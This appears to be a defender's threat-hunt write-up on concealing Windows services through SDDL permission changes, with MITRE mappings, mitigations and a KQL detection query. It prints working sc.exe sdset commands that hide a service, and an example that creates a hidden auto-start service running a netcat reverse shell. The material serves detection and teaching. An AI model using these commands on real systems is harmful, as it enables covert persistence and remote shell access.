# Hidden Services
### EXECUTIVE SUMMARY
Microsoft Windows Services is a feature built into Windows that enables users to create processes and run executable applications in independent sessions. The intent is to specify services that can automatically launch, persist through machine reboots, run independently of user accounts, and do not require a user's interaction or knowledge of the service. Threat actors target Windows Services for its access and persistence on victims' machines.
 Threat actors can exploit a compromised host by utilizing and concealing Windows Services to install malware, establish a reverse shell to a C2, and execute commands. While many legitimate processes operate through Windows Services, any hidden processes should be thoroughly examined and investigated for potential malicious activity. Antivirus scans and security patches may not mitigate hidden Windows Service compromises. Detecting and investigating hidden services that could allow the threat actor to regain access once the service restarts upon the next boot is critical.

### Hypothesis
The objective of this threat hunt is to uncover and audit the legitimacy of hidden services that could allow unauthorized access in the environment that has not been detected. 

## MITRE ATT&CK
### Tactics:
    • Execution https://attack.mitre.org/tactics/TA0002/ 
    • Persistence https://attack.mitre.org/tactics/TA0003/ 
    • Privilege Escalation https://attack.mitre.org/tactics/TA0004/ 

### Techniques:
    • System Services: Service Execution https://attack.mitre.org/techniques/T1569/002/ 
    • Create or Modify System Process: Windows Service https://attack.mitre.org/techniques/T1543/003/ 

## TECHNICAL SUMMARY
### Overview
Services can be created to do Malicious activity and can be hidden using SDDL. The following is a walk through of how to see the services, hide them, unhide them, and what tools can be used to investigate a suspected malicious activity. 

### Threat Description 
In my examples I will use the service Audiosrv, this service is not malicious but allows me to walk through the steps an analyst and threat actor would take in a safe manner. Since this service should exist on all windows machines it means you would be able to test the information for yourself on a test VM in a safe manner.  In real life it would be a service created and controlled by the threat actor. 

```
SERVICE_NAME: Audiosrv
DISPLAY_NAME: Windows Audio
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
### Commands to show a service using powershell:
```
Get-Service 
Get-Service | Select-Object Name | Select-String -Pattern 'Audiosrv'
Get-WmiObject Win32_Service | Select-String -Pattern 'Audiosrv'
& $env:SystemRoot\System32\sc.exe query | Select-String -Pattern 'Audiosrv'
```
### Commands to show a service using CMD: 
```
sc.exe query Audiosrv
```
Windows services support the ability to control service permissions using the Service Descriptor Definition Language (SDDL). Through careful manipulation of the SDDL an attacker can hide their presence in a running service. 

The SDDL syntax is a little obtuse, but breaks down into the following elements:

D: - Set the Discretionary ACL (DACL) permissions on the service
```
(D;;DCLCWPDTSD;;;IU) - Deny Interactive Users the following permissions:
  DC - Delete Child
  LC - List Children
  WP - Write Property
  DT - Delete Tree
  SD - Service Delete
```

This SDDL block can be repeated for services (SU) and administrators (BA) as well. By making this change to the service, the persistence mechanism is hidden from the defenders. Services.exe, Get-Service, sc query nor any other service control tool I'm aware of will enumerate the hidden service.

### Show SDDL: 
```
sc sdshow Audiosrv
```
Note: this must be run in CMD not in powershell

### Hide Audiosrv service from being seen:
```
sc.exe sdset Audiosrv "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

Once it is hidden none of the previous commands that would list all services will work. Knowing the Name allows you to try targeted show service commands. When the service exists but is hidden you get an "Access is denied" error and if the service doesn't exist on that computer a "Service was not found on computer" error. 

Thankfully if you know the name then you can also run the 'sc sdshow Audiosrv' command to display its SDDL permissions or 'sc sdset Audiosrv' command to change it to being a visible service again, as demonstrated below. 

### Unhide Audiosrv:
```
sc.exe sdset Audiosrv "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

Note: the first letter after the open parenthesis ‘(‘ is now the letter ‘A’ for allow instead of ‘D’ for deny. You can use the tool Services.exe to view services that aren't hidden. This will let you inspect the service and see what it is doing. 

### Example Of Malicious Use: 
Creating an evil service with a netcat reverse shell:
```
C:\> sc create evilsvc binpath= "c:\tools\nc 127.0.0.1 31337 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc.exe sdset evilsvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
C:\> sc start evilsvc
```

### Prevention Recommendations
    • Lock down accounts that can create services.

### Mitigation Recommendations
    • if Malicious activity is detected then you should change the password of the user that was exploited and setup MFA if it is not already setup. 
    • Look for any other devices the user has had contact with (logged into) since the known breach took place and investigate those devices for malicious activity and files. 
    • Cut this device off from the network and begin checking for other malicious activity or files. 
    • Because this is a sophisticated attack meant to hide malicious activity, a normal scan might not identify all threats. If this device can be reinstalled from scratch that should be a consideration once the full investigation has been completed.

### References 
    1. https://www.sans.org/blog/red-team-tactics-hiding-windows-services/ 
    2. https://medium.com/@mahdihatami.k/attack-and-hunting-lateral-movement-with-service-control-manager-svcctl-6424d3d41a0a 
    3. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md 
    4. https://www.ired.team/offensive-security/persistence/t1035-service-execution 
    5. https://pentestlab.blog/2023/03/20/persistence-service-control-manager/ 
    6. https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/ 
    7. https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.4 
    8. https://nettools.net/sddl-viewer/ 
    9. https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/ 

# KQL:
```kql
let HideService = @'(.*)sc(\.exe)?(.*)sdset(.*)((\w:)?\((D);+\w+;+(IU|SU|BA)?\))(.+)'
;
let ClearObf = @'(\^|(")+|\$|%|\+|("\+"))'
;
let SEvent = SecurityEvent
| extend Deobf_CommandLine=replace_regex(CommandLine, ClearObf, '')
| where Deobf_CommandLine matches regex HideService
;
let DEvent = DeviceEvents
| extend InitiatingDeobf_CommandLine=replace_regex(InitiatingProcessCommandLine, ClearObf, '')
| extend Deobf_CommandLine=replace_regex(ProcessCommandLine, ClearObf, '')
| where InitiatingDeobf_CommandLine matches regex HideService or Deobf_CommandLine matches regex HideService
;
let DPEvent = DeviceProcessEvents
| extend InitiatingDeobf_CommandLine=replace_regex(InitiatingProcessCommandLine, ClearObf, '')
| extend Deobf_CommandLine=replace_regex(ProcessCommandLine, ClearObf, '')
| where InitiatingDeobf_CommandLine matches regex HideService or Deobf_CommandLine matches regex HideService
;
let DFEvent = DeviceFileEvents
| extend InitiatingDeobf_CommandLine=replace_regex(InitiatingProcessCommandLine, ClearObf, '')
| where InitiatingDeobf_CommandLine matches regex HideService
;
let DREvent = DeviceRegistryEvents
| extend InitiatingDeobf_CommandLine=replace_regex(InitiatingProcessCommandLine, ClearObf, '')
| where InitiatingDeobf_CommandLine matches regex HideService
;
SEvent
| join kind=fullouter (DPEvent) on TimeGenerated
| join kind=fullouter (DFEvent) on TimeGenerated
| join kind=fullouter (DREvent) on TimeGenerated
| join kind=fullouter (DEvent) on TimeGenerated
| extend InitiatingDeobf_CommandLine = coalesce(InitiatingDeobf_CommandLine, InitiatingDeobf_CommandLine1, InitiatingDeobf_CommandLine2, InitiatingDeobf_CommandLine3)
| extend Deobf_CommandLine = coalesce(Deobf_CommandLine, Deobf_CommandLine1)
| extend TimeGenerated = coalesce(TimeGenerated, TimeGenerated1, TimeGenerated2, TimeGenerated3, TimeGenerated4)
| extend DeviceName = coalesce(DeviceName, DeviceName1, DeviceName2, DeviceName3, Computer)
| extend AccountName = coalesce(AccountName, AccountName1, AccountName2)
| extend InitiatingProcessAccountName = coalesce(InitiatingProcessAccountName, InitiatingProcessAccountName1, InitiatingProcessAccountName2, InitiatingProcessAccountName3)
| extend InitiatingProcessAccountUpn = coalesce(InitiatingProcessAccountUpn, InitiatingProcessAccountUpn1, InitiatingProcessAccountUpn2, InitiatingProcessAccountUpn3)
```
